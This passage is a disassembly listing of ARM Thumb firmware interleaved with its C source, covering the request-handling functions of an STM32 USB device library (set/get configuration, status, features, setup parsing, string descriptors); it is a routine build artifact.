static USBD_StatusTypeDef USBD_SetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800be4c:	b580      	push	{r7, lr}
 800be4e:	b084      	sub	sp, #16
 800be50:	af00      	add	r7, sp, #0
 800be52:	6078      	str	r0, [r7, #4]
 800be54:	6039      	str	r1, [r7, #0]
  USBD_StatusTypeDef ret = USBD_OK;
 800be56:	2300      	movs	r3, #0
 800be58:	73fb      	strb	r3, [r7, #15]
  static uint8_t cfgidx;

  cfgidx = (uint8_t)(req->wValue);
 800be5a:	683b      	ldr	r3, [r7, #0]
 800be5c:	885b      	ldrh	r3, [r3, #2]
 800be5e:	b2da      	uxtb	r2, r3
 800be60:	4b4e      	ldr	r3, [pc, #312]	; (800bf9c <USBD_SetConfig+0x150>)
 800be62:	701a      	strb	r2, [r3, #0]

  if (cfgidx > USBD_MAX_NUM_CONFIGURATION)
 800be64:	4b4d      	ldr	r3, [pc, #308]	; (800bf9c <USBD_SetConfig+0x150>)
 800be66:	781b      	ldrb	r3, [r3, #0]
 800be68:	2b01      	cmp	r3, #1
 800be6a:	d905      	bls.n	800be78 <USBD_SetConfig+0x2c>
  {
    USBD_CtlError(pdev, req);
 800be6c:	6839      	ldr	r1, [r7, #0]
 800be6e:	6878      	ldr	r0, [r7, #4]
 800be70:	f000 f985 	bl	800c17e <USBD_CtlError>
    return USBD_FAIL;
 800be74:	2303      	movs	r3, #3
 800be76:	e08c      	b.n	800bf92 <USBD_SetConfig+0x146>
  }

  switch (pdev->dev_state)
 800be78:	687b      	ldr	r3, [r7, #4]
 800be7a:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800be7e:	b2db      	uxtb	r3, r3
 800be80:	2b02      	cmp	r3, #2
 800be82:	d002      	beq.n	800be8a <USBD_SetConfig+0x3e>
 800be84:	2b03      	cmp	r3, #3
 800be86:	d029      	beq.n	800bedc <USBD_SetConfig+0x90>
 800be88:	e075      	b.n	800bf76 <USBD_SetConfig+0x12a>
  {
    case USBD_STATE_ADDRESSED:
      if (cfgidx != 0U)
 800be8a:	4b44      	ldr	r3, [pc, #272]	; (800bf9c <USBD_SetConfig+0x150>)
 800be8c:	781b      	ldrb	r3, [r3, #0]
 800be8e:	2b00      	cmp	r3, #0
 800be90:	d020      	beq.n	800bed4 <USBD_SetConfig+0x88>
      {
        pdev->dev_config = cfgidx;
 800be92:	4b42      	ldr	r3, [pc, #264]	; (800bf9c <USBD_SetConfig+0x150>)
 800be94:	781b      	ldrb	r3, [r3, #0]
 800be96:	461a      	mov	r2, r3
 800be98:	687b      	ldr	r3, [r7, #4]
 800be9a:	605a      	str	r2, [r3, #4]

        ret = USBD_SetClassConfig(pdev, cfgidx);
 800be9c:	4b3f      	ldr	r3, [pc, #252]	; (800bf9c <USBD_SetConfig+0x150>)
 800be9e:	781b      	ldrb	r3, [r3, #0]
 800bea0:	4619      	mov	r1, r3
 800bea2:	6878      	ldr	r0, [r7, #4]
 800bea4:	f7ff f848 	bl	800af38 <USBD_SetClassConfig>
 800bea8:	4603      	mov	r3, r0
 800beaa:	73fb      	strb	r3, [r7, #15]

        if (ret != USBD_OK)
 800beac:	7bfb      	ldrb	r3, [r7, #15]
 800beae:	2b00      	cmp	r3, #0
 800beb0:	d008      	beq.n	800bec4 <USBD_SetConfig+0x78>
        {
          USBD_CtlError(pdev, req);
 800beb2:	6839      	ldr	r1, [r7, #0]
 800beb4:	6878      	ldr	r0, [r7, #4]
 800beb6:	f000 f962 	bl	800c17e <USBD_CtlError>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800beba:	687b      	ldr	r3, [r7, #4]
 800bebc:	2202      	movs	r2, #2
 800bebe:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800bec2:	e065      	b.n	800bf90 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800bec4:	6878      	ldr	r0, [r7, #4]
 800bec6:	f000 fa25 	bl	800c314 <USBD_CtlSendStatus>
          pdev->dev_state = USBD_STATE_CONFIGURED;
 800beca:	687b      	ldr	r3, [r7, #4]
 800becc:	2203      	movs	r2, #3
 800bece:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800bed2:	e05d      	b.n	800bf90 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800bed4:	6878      	ldr	r0, [r7, #4]
 800bed6:	f000 fa1d 	bl	800c314 <USBD_CtlSendStatus>
      break;
 800beda:	e059      	b.n	800bf90 <USBD_SetConfig+0x144>

    case USBD_STATE_CONFIGURED:
      if (cfgidx == 0U)
 800bedc:	4b2f      	ldr	r3, [pc, #188]	; (800bf9c <USBD_SetConfig+0x150>)
 800bede:	781b      	ldrb	r3, [r3, #0]
 800bee0:	2b00      	cmp	r3, #0
 800bee2:	d112      	bne.n	800bf0a <USBD_SetConfig+0xbe>
      {
        pdev->dev_state = USBD_STATE_ADDRESSED;
 800bee4:	687b      	ldr	r3, [r7, #4]
 800bee6:	2202      	movs	r2, #2
 800bee8:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
        pdev->dev_config = cfgidx;
 800beec:	4b2b      	ldr	r3, [pc, #172]	; (800bf9c <USBD_SetConfig+0x150>)
 800beee:	781b      	ldrb	r3, [r3, #0]
 800bef0:	461a      	mov	r2, r3
 800bef2:	687b      	ldr	r3, [r7, #4]
 800bef4:	605a      	str	r2, [r3, #4]
        (void)USBD_ClrClassConfig(pdev, cfgidx);
 800bef6:	4b29      	ldr	r3, [pc, #164]	; (800bf9c <USBD_SetConfig+0x150>)
 800bef8:	781b      	ldrb	r3, [r3, #0]
 800befa:	4619      	mov	r1, r3
 800befc:	6878      	ldr	r0, [r7, #4]
 800befe:	f7ff f837 	bl	800af70 <USBD_ClrClassConfig>
        (void)USBD_CtlSendStatus(pdev);
 800bf02:	6878      	ldr	r0, [r7, #4]
 800bf04:	f000 fa06 	bl	800c314 <USBD_CtlSendStatus>
      }
      else
      {
        (void)USBD_CtlSendStatus(pdev);
      }
      break;
 800bf08:	e042      	b.n	800bf90 <USBD_SetConfig+0x144>
      else if (cfgidx != pdev->dev_config)
 800bf0a:	4b24      	ldr	r3, [pc, #144]	; (800bf9c <USBD_SetConfig+0x150>)
 800bf0c:	781b      	ldrb	r3, [r3, #0]
 800bf0e:	461a      	mov	r2, r3
 800bf10:	687b      	ldr	r3, [r7, #4]
 800bf12:	685b      	ldr	r3, [r3, #4]
 800bf14:	429a      	cmp	r2, r3
 800bf16:	d02a      	beq.n	800bf6e <USBD_SetConfig+0x122>
        (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800bf18:	687b      	ldr	r3, [r7, #4]
 800bf1a:	685b      	ldr	r3, [r3, #4]
 800bf1c:	b2db      	uxtb	r3, r3
 800bf1e:	4619      	mov	r1, r3
 800bf20:	6878      	ldr	r0, [r7, #4]
 800bf22:	f7ff f825 	bl	800af70 <USBD_ClrClassConfig>
        pdev->dev_config = cfgidx;
 800bf26:	4b1d      	ldr	r3, [pc, #116]	; (800bf9c <USBD_SetConfig+0x150>)
 800bf28:	781b      	ldrb	r3, [r3, #0]
 800bf2a:	461a      	mov	r2, r3
 800bf2c:	687b      	ldr	r3, [r7, #4]
 800bf2e:	605a      	str	r2, [r3, #4]
        ret = USBD_SetClassConfig(pdev, cfgidx);
 800bf30:	4b1a      	ldr	r3, [pc, #104]	; (800bf9c <USBD_SetConfig+0x150>)
 800bf32:	781b      	ldrb	r3, [r3, #0]
 800bf34:	4619      	mov	r1, r3
 800bf36:	6878      	ldr	r0, [r7, #4]
 800bf38:	f7fe fffe 	bl	800af38 <USBD_SetClassConfig>
 800bf3c:	4603      	mov	r3, r0
 800bf3e:	73fb      	strb	r3, [r7, #15]
        if (ret != USBD_OK)
 800bf40:	7bfb      	ldrb	r3, [r7, #15]
 800bf42:	2b00      	cmp	r3, #0
 800bf44:	d00f      	beq.n	800bf66 <USBD_SetConfig+0x11a>
          USBD_CtlError(pdev, req);
 800bf46:	6839      	ldr	r1, [r7, #0]
 800bf48:	6878      	ldr	r0, [r7, #4]
 800bf4a:	f000 f918 	bl	800c17e <USBD_CtlError>
          (void)USBD_ClrClassConfig(pdev, (uint8_t)pdev->dev_config);
 800bf4e:	687b      	ldr	r3, [r7, #4]
 800bf50:	685b      	ldr	r3, [r3, #4]
 800bf52:	b2db      	uxtb	r3, r3
 800bf54:	4619      	mov	r1, r3
 800bf56:	6878      	ldr	r0, [r7, #4]
 800bf58:	f7ff f80a 	bl	800af70 <USBD_ClrClassConfig>
          pdev->dev_state = USBD_STATE_ADDRESSED;
 800bf5c:	687b      	ldr	r3, [r7, #4]
 800bf5e:	2202      	movs	r2, #2
 800bf60:	f883 229c 	strb.w	r2, [r3, #668]	; 0x29c
      break;
 800bf64:	e014      	b.n	800bf90 <USBD_SetConfig+0x144>
          (void)USBD_CtlSendStatus(pdev);
 800bf66:	6878      	ldr	r0, [r7, #4]
 800bf68:	f000 f9d4 	bl	800c314 <USBD_CtlSendStatus>
      break;
 800bf6c:	e010      	b.n	800bf90 <USBD_SetConfig+0x144>
        (void)USBD_CtlSendStatus(pdev);
 800bf6e:	6878      	ldr	r0, [r7, #4]
 800bf70:	f000 f9d0 	bl	800c314 <USBD_CtlSendStatus>
      break;
 800bf74:	e00c      	b.n	800bf90 <USBD_SetConfig+0x144>

    default:
      USBD_CtlError(pdev, req);
 800bf76:	6839      	ldr	r1, [r7, #0]
 800bf78:	6878      	ldr	r0, [r7, #4]
 800bf7a:	f000 f900 	bl	800c17e <USBD_CtlError>
      (void)USBD_ClrClassConfig(pdev, cfgidx);
 800bf7e:	4b07      	ldr	r3, [pc, #28]	; (800bf9c <USBD_SetConfig+0x150>)
 800bf80:	781b      	ldrb	r3, [r3, #0]
 800bf82:	4619      	mov	r1, r3
 800bf84:	6878      	ldr	r0, [r7, #4]
 800bf86:	f7fe fff3 	bl	800af70 <USBD_ClrClassConfig>
      ret = USBD_FAIL;
 800bf8a:	2303      	movs	r3, #3
 800bf8c:	73fb      	strb	r3, [r7, #15]
      break;
 800bf8e:	bf00      	nop
  }

  return ret;
 800bf90:	7bfb      	ldrb	r3, [r7, #15]
}
 800bf92:	4618      	mov	r0, r3
 800bf94:	3710      	adds	r7, #16
 800bf96:	46bd      	mov	sp, r7
 800bf98:	bd80      	pop	{r7, pc}
 800bf9a:	bf00      	nop
 800bf9c:	200003bc 	.word	0x200003bc

0800bfa0 <USBD_GetConfig>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetConfig(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800bfa0:	b580      	push	{r7, lr}
 800bfa2:	b082      	sub	sp, #8
 800bfa4:	af00      	add	r7, sp, #0
 800bfa6:	6078      	str	r0, [r7, #4]
 800bfa8:	6039      	str	r1, [r7, #0]
  if (req->wLength != 1U)
 800bfaa:	683b      	ldr	r3, [r7, #0]
 800bfac:	88db      	ldrh	r3, [r3, #6]
 800bfae:	2b01      	cmp	r3, #1
 800bfb0:	d004      	beq.n	800bfbc <USBD_GetConfig+0x1c>
  {
    USBD_CtlError(pdev, req);
 800bfb2:	6839      	ldr	r1, [r7, #0]
 800bfb4:	6878      	ldr	r0, [r7, #4]
 800bfb6:	f000 f8e2 	bl	800c17e <USBD_CtlError>
      default:
        USBD_CtlError(pdev, req);
        break;
    }
  }
}
 800bfba:	e023      	b.n	800c004 <USBD_GetConfig+0x64>
    switch (pdev->dev_state)
 800bfbc:	687b      	ldr	r3, [r7, #4]
 800bfbe:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800bfc2:	b2db      	uxtb	r3, r3
 800bfc4:	2b02      	cmp	r3, #2
 800bfc6:	dc02      	bgt.n	800bfce <USBD_GetConfig+0x2e>
 800bfc8:	2b00      	cmp	r3, #0
 800bfca:	dc03      	bgt.n	800bfd4 <USBD_GetConfig+0x34>
 800bfcc:	e015      	b.n	800bffa <USBD_GetConfig+0x5a>
 800bfce:	2b03      	cmp	r3, #3
 800bfd0:	d00b      	beq.n	800bfea <USBD_GetConfig+0x4a>
 800bfd2:	e012      	b.n	800bffa <USBD_GetConfig+0x5a>
        pdev->dev_default_config = 0U;
 800bfd4:	687b      	ldr	r3, [r7, #4]
 800bfd6:	2200      	movs	r2, #0
 800bfd8:	609a      	str	r2, [r3, #8]
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_default_config, 1U);
 800bfda:	687b      	ldr	r3, [r7, #4]
 800bfdc:	3308      	adds	r3, #8
 800bfde:	2201      	movs	r2, #1
 800bfe0:	4619      	mov	r1, r3
 800bfe2:	6878      	ldr	r0, [r7, #4]
 800bfe4:	f000 f93c 	bl	800c260 <USBD_CtlSendData>
        break;
 800bfe8:	e00c      	b.n	800c004 <USBD_GetConfig+0x64>
        (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config, 1U);
 800bfea:	687b      	ldr	r3, [r7, #4]
 800bfec:	3304      	adds	r3, #4
 800bfee:	2201      	movs	r2, #1
 800bff0:	4619      	mov	r1, r3
 800bff2:	6878      	ldr	r0, [r7, #4]
 800bff4:	f000 f934 	bl	800c260 <USBD_CtlSendData>
        break;
 800bff8:	e004      	b.n	800c004 <USBD_GetConfig+0x64>
        USBD_CtlError(pdev, req);
 800bffa:	6839      	ldr	r1, [r7, #0]
 800bffc:	6878      	ldr	r0, [r7, #4]
 800bffe:	f000 f8be 	bl	800c17e <USBD_CtlError>
        break;
 800c002:	bf00      	nop
}
 800c004:	bf00      	nop
 800c006:	3708      	adds	r7, #8
 800c008:	46bd      	mov	sp, r7
 800c00a:	bd80      	pop	{r7, pc}

0800c00c <USBD_GetStatus>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_GetStatus(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c00c:	b580      	push	{r7, lr}
 800c00e:	b082      	sub	sp, #8
 800c010:	af00      	add	r7, sp, #0
 800c012:	6078      	str	r0, [r7, #4]
 800c014:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c016:	687b      	ldr	r3, [r7, #4]
 800c018:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c01c:	b2db      	uxtb	r3, r3
 800c01e:	3b01      	subs	r3, #1
 800c020:	2b02      	cmp	r3, #2
 800c022:	d81e      	bhi.n	800c062 <USBD_GetStatus+0x56>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wLength != 0x2U)
 800c024:	683b      	ldr	r3, [r7, #0]
 800c026:	88db      	ldrh	r3, [r3, #6]
 800c028:	2b02      	cmp	r3, #2
 800c02a:	d004      	beq.n	800c036 <USBD_GetStatus+0x2a>
      {
        USBD_CtlError(pdev, req);
 800c02c:	6839      	ldr	r1, [r7, #0]
 800c02e:	6878      	ldr	r0, [r7, #4]
 800c030:	f000 f8a5 	bl	800c17e <USBD_CtlError>
        break;
 800c034:	e01a      	b.n	800c06c <USBD_GetStatus+0x60>
      }

#if (USBD_SELF_POWERED == 1U)
      pdev->dev_config_status = USB_CONFIG_SELF_POWERED;
 800c036:	687b      	ldr	r3, [r7, #4]
 800c038:	2201      	movs	r2, #1
 800c03a:	60da      	str	r2, [r3, #12]
#else
      pdev->dev_config_status = 0U;
#endif /* USBD_SELF_POWERED */

      if (pdev->dev_remote_wakeup != 0U)
 800c03c:	687b      	ldr	r3, [r7, #4]
 800c03e:	f8d3 32a4 	ldr.w	r3, [r3, #676]	; 0x2a4
 800c042:	2b00      	cmp	r3, #0
 800c044:	d005      	beq.n	800c052 <USBD_GetStatus+0x46>
      {
        pdev->dev_config_status |= USB_CONFIG_REMOTE_WAKEUP;
 800c046:	687b      	ldr	r3, [r7, #4]
 800c048:	68db      	ldr	r3, [r3, #12]
 800c04a:	f043 0202 	orr.w	r2, r3, #2
 800c04e:	687b      	ldr	r3, [r7, #4]
 800c050:	60da      	str	r2, [r3, #12]
      }

      (void)USBD_CtlSendData(pdev, (uint8_t *)&pdev->dev_config_status, 2U);
 800c052:	687b      	ldr	r3, [r7, #4]
 800c054:	330c      	adds	r3, #12
 800c056:	2202      	movs	r2, #2
 800c058:	4619      	mov	r1, r3
 800c05a:	6878      	ldr	r0, [r7, #4]
 800c05c:	f000 f900 	bl	800c260 <USBD_CtlSendData>
      break;
 800c060:	e004      	b.n	800c06c <USBD_GetStatus+0x60>

    default:
      USBD_CtlError(pdev, req);
 800c062:	6839      	ldr	r1, [r7, #0]
 800c064:	6878      	ldr	r0, [r7, #4]
 800c066:	f000 f88a 	bl	800c17e <USBD_CtlError>
      break;
 800c06a:	bf00      	nop
  }
}
 800c06c:	bf00      	nop
 800c06e:	3708      	adds	r7, #8
 800c070:	46bd      	mov	sp, r7
 800c072:	bd80      	pop	{r7, pc}

0800c074 <USBD_SetFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_SetFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c074:	b580      	push	{r7, lr}
 800c076:	b082      	sub	sp, #8
 800c078:	af00      	add	r7, sp, #0
 800c07a:	6078      	str	r0, [r7, #4]
 800c07c:	6039      	str	r1, [r7, #0]
  if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c07e:	683b      	ldr	r3, [r7, #0]
 800c080:	885b      	ldrh	r3, [r3, #2]
 800c082:	2b01      	cmp	r3, #1
 800c084:	d107      	bne.n	800c096 <USBD_SetFeature+0x22>
  {
    pdev->dev_remote_wakeup = 1U;
 800c086:	687b      	ldr	r3, [r7, #4]
 800c088:	2201      	movs	r2, #1
 800c08a:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
    (void)USBD_CtlSendStatus(pdev);
 800c08e:	6878      	ldr	r0, [r7, #4]
 800c090:	f000 f940 	bl	800c314 <USBD_CtlSendStatus>
  }
  else
  {
    USBD_CtlError(pdev, req);
  }
}
 800c094:	e013      	b.n	800c0be <USBD_SetFeature+0x4a>
  else if (req->wValue == USB_FEATURE_TEST_MODE)
 800c096:	683b      	ldr	r3, [r7, #0]
 800c098:	885b      	ldrh	r3, [r3, #2]
 800c09a:	2b02      	cmp	r3, #2
 800c09c:	d10b      	bne.n	800c0b6 <USBD_SetFeature+0x42>
    pdev->dev_test_mode = (uint8_t)(req->wIndex >> 8);
 800c09e:	683b      	ldr	r3, [r7, #0]
 800c0a0:	889b      	ldrh	r3, [r3, #4]
 800c0a2:	0a1b      	lsrs	r3, r3, #8
 800c0a4:	b29b      	uxth	r3, r3
 800c0a6:	b2da      	uxtb	r2, r3
 800c0a8:	687b      	ldr	r3, [r7, #4]
 800c0aa:	f883 22a0 	strb.w	r2, [r3, #672]	; 0x2a0
    (void)USBD_CtlSendStatus(pdev);
 800c0ae:	6878      	ldr	r0, [r7, #4]
 800c0b0:	f000 f930 	bl	800c314 <USBD_CtlSendStatus>
}
 800c0b4:	e003      	b.n	800c0be <USBD_SetFeature+0x4a>
    USBD_CtlError(pdev, req);
 800c0b6:	6839      	ldr	r1, [r7, #0]
 800c0b8:	6878      	ldr	r0, [r7, #4]
 800c0ba:	f000 f860 	bl	800c17e <USBD_CtlError>
}
 800c0be:	bf00      	nop
 800c0c0:	3708      	adds	r7, #8
 800c0c2:	46bd      	mov	sp, r7
 800c0c4:	bd80      	pop	{r7, pc}

0800c0c6 <USBD_ClrFeature>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval status
  */
static void USBD_ClrFeature(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c0c6:	b580      	push	{r7, lr}
 800c0c8:	b082      	sub	sp, #8
 800c0ca:	af00      	add	r7, sp, #0
 800c0cc:	6078      	str	r0, [r7, #4]
 800c0ce:	6039      	str	r1, [r7, #0]
  switch (pdev->dev_state)
 800c0d0:	687b      	ldr	r3, [r7, #4]
 800c0d2:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 800c0d6:	b2db      	uxtb	r3, r3
 800c0d8:	3b01      	subs	r3, #1
 800c0da:	2b02      	cmp	r3, #2
 800c0dc:	d80b      	bhi.n	800c0f6 <USBD_ClrFeature+0x30>
  {
    case USBD_STATE_DEFAULT:
    case USBD_STATE_ADDRESSED:
    case USBD_STATE_CONFIGURED:
      if (req->wValue == USB_FEATURE_REMOTE_WAKEUP)
 800c0de:	683b      	ldr	r3, [r7, #0]
 800c0e0:	885b      	ldrh	r3, [r3, #2]
 800c0e2:	2b01      	cmp	r3, #1
 800c0e4:	d10c      	bne.n	800c100 <USBD_ClrFeature+0x3a>
      {
        pdev->dev_remote_wakeup = 0U;
 800c0e6:	687b      	ldr	r3, [r7, #4]
 800c0e8:	2200      	movs	r2, #0
 800c0ea:	f8c3 22a4 	str.w	r2, [r3, #676]	; 0x2a4
        (void)USBD_CtlSendStatus(pdev);
 800c0ee:	6878      	ldr	r0, [r7, #4]
 800c0f0:	f000 f910 	bl	800c314 <USBD_CtlSendStatus>
      }
      break;
 800c0f4:	e004      	b.n	800c100 <USBD_ClrFeature+0x3a>

    default:
      USBD_CtlError(pdev, req);
 800c0f6:	6839      	ldr	r1, [r7, #0]
 800c0f8:	6878      	ldr	r0, [r7, #4]
 800c0fa:	f000 f840 	bl	800c17e <USBD_CtlError>
      break;
 800c0fe:	e000      	b.n	800c102 <USBD_ClrFeature+0x3c>
      break;
 800c100:	bf00      	nop
  }
}
 800c102:	bf00      	nop
 800c104:	3708      	adds	r7, #8
 800c106:	46bd      	mov	sp, r7
 800c108:	bd80      	pop	{r7, pc}

0800c10a <USBD_ParseSetupRequest>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_ParseSetupRequest(USBD_SetupReqTypedef *req, uint8_t *pdata)
{
 800c10a:	b580      	push	{r7, lr}
 800c10c:	b084      	sub	sp, #16
 800c10e:	af00      	add	r7, sp, #0
 800c110:	6078      	str	r0, [r7, #4]
 800c112:	6039      	str	r1, [r7, #0]
  uint8_t *pbuff = pdata;
 800c114:	683b      	ldr	r3, [r7, #0]
 800c116:	60fb      	str	r3, [r7, #12]

  req->bmRequest = *(uint8_t *)(pbuff);
 800c118:	68fb      	ldr	r3, [r7, #12]
 800c11a:	781a      	ldrb	r2, [r3, #0]
 800c11c:	687b      	ldr	r3, [r7, #4]
 800c11e:	701a      	strb	r2, [r3, #0]

  pbuff++;
 800c120:	68fb      	ldr	r3, [r7, #12]
 800c122:	3301      	adds	r3, #1
 800c124:	60fb      	str	r3, [r7, #12]
  req->bRequest = *(uint8_t *)(pbuff);
 800c126:	68fb      	ldr	r3, [r7, #12]
 800c128:	781a      	ldrb	r2, [r3, #0]
 800c12a:	687b      	ldr	r3, [r7, #4]
 800c12c:	705a      	strb	r2, [r3, #1]

  pbuff++;
 800c12e:	68fb      	ldr	r3, [r7, #12]
 800c130:	3301      	adds	r3, #1
 800c132:	60fb      	str	r3, [r7, #12]
  req->wValue = SWAPBYTE(pbuff);
 800c134:	68f8      	ldr	r0, [r7, #12]
 800c136:	f7ff fa16 	bl	800b566 <SWAPBYTE>
 800c13a:	4603      	mov	r3, r0
 800c13c:	461a      	mov	r2, r3
 800c13e:	687b      	ldr	r3, [r7, #4]
 800c140:	805a      	strh	r2, [r3, #2]

  pbuff++;
 800c142:	68fb      	ldr	r3, [r7, #12]
 800c144:	3301      	adds	r3, #1
 800c146:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c148:	68fb      	ldr	r3, [r7, #12]
 800c14a:	3301      	adds	r3, #1
 800c14c:	60fb      	str	r3, [r7, #12]
  req->wIndex = SWAPBYTE(pbuff);
 800c14e:	68f8      	ldr	r0, [r7, #12]
 800c150:	f7ff fa09 	bl	800b566 <SWAPBYTE>
 800c154:	4603      	mov	r3, r0
 800c156:	461a      	mov	r2, r3
 800c158:	687b      	ldr	r3, [r7, #4]
 800c15a:	809a      	strh	r2, [r3, #4]

  pbuff++;
 800c15c:	68fb      	ldr	r3, [r7, #12]
 800c15e:	3301      	adds	r3, #1
 800c160:	60fb      	str	r3, [r7, #12]
  pbuff++;
 800c162:	68fb      	ldr	r3, [r7, #12]
 800c164:	3301      	adds	r3, #1
 800c166:	60fb      	str	r3, [r7, #12]
  req->wLength = SWAPBYTE(pbuff);
 800c168:	68f8      	ldr	r0, [r7, #12]
 800c16a:	f7ff f9fc 	bl	800b566 <SWAPBYTE>
 800c16e:	4603      	mov	r3, r0
 800c170:	461a      	mov	r2, r3
 800c172:	687b      	ldr	r3, [r7, #4]
 800c174:	80da      	strh	r2, [r3, #6]
}
 800c176:	bf00      	nop
 800c178:	3710      	adds	r7, #16
 800c17a:	46bd      	mov	sp, r7
 800c17c:	bd80      	pop	{r7, pc}

0800c17e <USBD_CtlError>:
  * @param  pdev: device instance
  * @param  req: usb request
  * @retval None
  */
void USBD_CtlError(USBD_HandleTypeDef *pdev, USBD_SetupReqTypedef *req)
{
 800c17e:	b580      	push	{r7, lr}
 800c180:	b082      	sub	sp, #8
 800c182:	af00      	add	r7, sp, #0
 800c184:	6078      	str	r0, [r7, #4]
 800c186:	6039      	str	r1, [r7, #0]
  UNUSED(req);

  (void)USBD_LL_StallEP(pdev, 0x80U);
 800c188:	2180      	movs	r1, #128	; 0x80
 800c18a:	6878      	ldr	r0, [r7, #4]
 800c18c:	f000 fd6a 	bl	800cc64 <USBD_LL_StallEP>
  (void)USBD_LL_StallEP(pdev, 0U);
 800c190:	2100      	movs	r1, #0
 800c192:	6878      	ldr	r0, [r7, #4]
 800c194:	f000 fd66 	bl	800cc64 <USBD_LL_StallEP>
}
 800c198:	bf00      	nop
 800c19a:	3708      	adds	r7, #8
 800c19c:	46bd      	mov	sp, r7
 800c19e:	bd80      	pop	{r7, pc}

0800c1a0 <USBD_GetString>:
  * @param  unicode : Formatted string buffer (unicode)
  * @param  len : descriptor length
  * @retval None
  */
void USBD_GetString(uint8_t *desc, uint8_t *unicode, uint16_t *len)
{
 800c1a0:	b580      	push	{r7, lr}
 800c1a2:	b086      	sub	sp, #24
 800c1a4:	af00      	add	r7, sp, #0
 800c1a6:	60f8      	str	r0, [r7, #12]
 800c1a8:	60b9      	str	r1, [r7, #8]
 800c1aa:	607a      	str	r2, [r7, #4]
  uint8_t idx = 0U;
 800c1ac:	2300      	movs	r3, #0
 800c1ae:	75fb      	strb	r3, [r7, #23]
  uint8_t *pdesc;

  if (desc == NULL)
 800c1b0:	68fb      	ldr	r3, [r7, #12]
 800c1b2:	2b00      	cmp	r3, #0
 800c1b4:	d036      	beq.n	800c224 <USBD_GetString+0x84>
  {
    return;
  }

  pdesc = desc;
 800c1b6:	68fb      	ldr	r3, [r7, #12]
 800c1b8:	613b      	str	r3, [r7, #16]
  *len = ((uint16_t)USBD_GetLen(pdesc) * 2U) + 2U;
 800c1ba:	6938      	ldr	r0, [r7, #16]
 800c1bc:	f000 f836 	bl	800c22c <USBD_GetLen>
 800c1c0:	4603      	mov	r3, r0
 800c1c2:	3301      	adds	r3, #1
 800c1c4:	b29b      	uxth	r3, r3
 800c1c6:	005b      	lsls	r3, r3, #1
 800c1c8:	b29a      	uxth	r2, r3
 800c1ca:	687b      	ldr	r3, [r7, #4]
 800c1cc:	801a      	strh	r2, [r3, #0]

  unicode[idx] = *(uint8_t *)len;
 800c1ce:	7dfb      	ldrb	r3, [r7, #23]
 800c1d0:	68ba      	ldr	r2, [r7, #8]
 800c1d2:	4413      	add	r3, r2
 800c1d4:	687a      	ldr	r2, [r7, #4]
 800c1d6:	7812      	ldrb	r2, [r2, #0]
 800c1d8:	701a      	strb	r2, [r3, #0]
  idx++;
 800c1da:	7dfb      	ldrb	r3, [r7, #23]
 800c1dc:	3301      	adds	r3, #1
 800c1de:	75fb      	strb	r3, [r7, #23]
  unicode[idx] = USB_DESC_TYPE_STRING;
 800c1e0:	7dfb      	ldrb	r3, [r7, #23]
 800c1e2:	68ba      	ldr	r2, [r7, #8]
 800c1e4:	4413      	add	r3, r2
 800c1e6:	2203      	movs	r2, #3
 800c1e8:	701a      	strb	r2, [r3, #0]
  idx++;
 800c1ea:	7dfb      	ldrb	r3, [r7, #23]
 800c1ec:	3301      	adds	r3, #1
 800c1ee:	75fb      	strb	r3, [r7, #23]

  while (*pdesc != (uint8_t)'\0')
 800c1f0:	e013      	b.n	800c21a <USBD_GetString+0x7a>
  {
    unicode[idx] = *pdesc;
 800c1f2:	7dfb      	ldrb	r3, [r7, #23]
 800c1f4:	68ba      	ldr	r2, [r7, #8]
 800c1f6:	4413      	add	r3, r2
 800c1f8:	693a      	ldr	r2, [r7, #16]
 800c1fa:	7812      	ldrb	r2, [r2, #0]
 800c1fc:	701a      	strb	r2, [r3, #0]
    pdesc++;
 800c1fe:	693b      	ldr	r3, [r7, #16]
 800c200:	3301      	adds	r3, #1
 800c202:	613b      	str	r3, [r7, #16]
    idx++;
 800c204:	7dfb      	ldrb	r3, [r7, #23]
 800c206:	3301      	adds	r3, #1
 800c208:	75fb      	strb	r3, [r7, #23]

    unicode[idx] = 0U;
 800c20a:	7dfb      	ldrb	r3, [r7, #23]
 800c20c:	68ba      	ldr	r2, [r7, #8]
 800c20e:	4413      	add	r3, r2
 800c210:	2200      	movs	r2, #0
 800c212:	701a      	strb	r2, [r3, #0]
    idx++;
 800c214:	7dfb      	ldrb	r3, [r7, #23]
 800c216:	3301      	adds	r3, #1
 800c218:	75fb      	strb	r3, [r7, #23]
  while (*pdesc != (uint8_t)'\0')
 800c21a:	693b      	ldr	r3, [r7, #16]
 800c21c:	781b      	ldrb	r3, [r3, #0]
